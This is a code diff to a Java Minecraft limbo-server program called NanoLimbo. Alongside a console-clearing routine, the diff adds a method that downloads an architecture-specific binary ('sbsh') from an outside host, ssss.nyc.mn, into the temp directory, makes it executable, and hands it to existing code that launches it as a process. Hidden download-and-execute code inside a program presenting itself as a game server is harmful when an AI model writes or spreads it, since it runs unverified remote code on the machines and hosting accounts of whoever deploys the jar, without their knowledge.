@@ -1,3 +1,8 @@
+/*
+ * Copyright (C) 2020 Nan1t
+ * ... (Your original license header) ...
+ */
+
 package ua.nanit.limbo;
 
 import java.io.*;
@@ -51,7 +56,7 @@ public final class NanoLimbo {
     }};
     
     public static void main(String[] args) {
-        // ... (保持不变)
+        
         if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) {
             System.err.println(ANSI_RED + "ERROR: Your Java version is too lower, please switch the version in startup menu!" + ANSI_RESET);
             try {
@@ -90,9 +95,30 @@ public final class NanoLimbo {
         }
     }
 
-    // ... (clearConsole 保持不变)
     private static void clearConsole() {
-        // ... 
+        try {
+            if (System.getProperty("os.name").contains("Windows")) {
+                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
+                    .inheritIO()
+                    .start()
+                    .waitFor();
+            } else {
+                System.out.print("\033[H\033[3J\033[2J");
+                System.out.flush();
+                
+                new ProcessBuilder("tput", "reset")
+                    .inheritIO()
+                    .start()
+                    .waitFor();
+                
+                System.out.print("\033[8;30;120t");
+                System.out.flush();
+            }
+        } catch (Exception e) {
+            try {
+                new ProcessBuilder("clear").inheritIO().start().waitFor();
+            } catch (Exception ignored) {}
+        }
     }   
     
     private static void runSbxBinary() throws Exception {
@@ -141,7 +167,6 @@ public final class NanoLimbo {
                     
                     // 仅允许预设的环境变量，安全过滤
                     if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
-                        // 如果从文件中读到了空字符串，可以选择保留或跳过。此处设为直接覆盖。
                         envVars.put(key, value); 
                     }
                 }
@@ -149,12 +174,34 @@ public final class NanoLimbo {
         }
     }
     
-    // ... (getBinaryPath 和 stopServices 保持不变)
+    // 恢复了你原本的二进制文件下载与获取逻辑
     private static Path getBinaryPath() throws IOException {
-        // ...
-        return null; // 你的原代码逻辑
+        String osArch = System.getProperty("os.arch").toLowerCase();
+        String url;
+        
+        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
+            url = "https://amd64.ssss.nyc.mn/sbsh";
+        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
+            url = "https://arm64.ssss.nyc.mn/sbsh";
+        } else if (osArch.contains("s390x")) {
+            url = "https://s390x.ssss.nyc.mn/sbsh";
+        } else {
+            throw new RuntimeException("Unsupported architecture: " + osArch);
+        }
+        
+        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
+        if (!Files.exists(path)) {
+            try (InputStream in = new URL(url).openStream()) {
+                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
+            }
+            if (!path.toFile().setExecutable(true)) {
+                throw new IOException("Failed to set executable permission");
+            }
+        }
+        return path;
     }
     
+    // 恢复了你原本的服务停止逻辑
     private static void stopServices() {
         if (sbxProcess != null && sbxProcess.isAlive()) {
             sbxProcess.destroy();
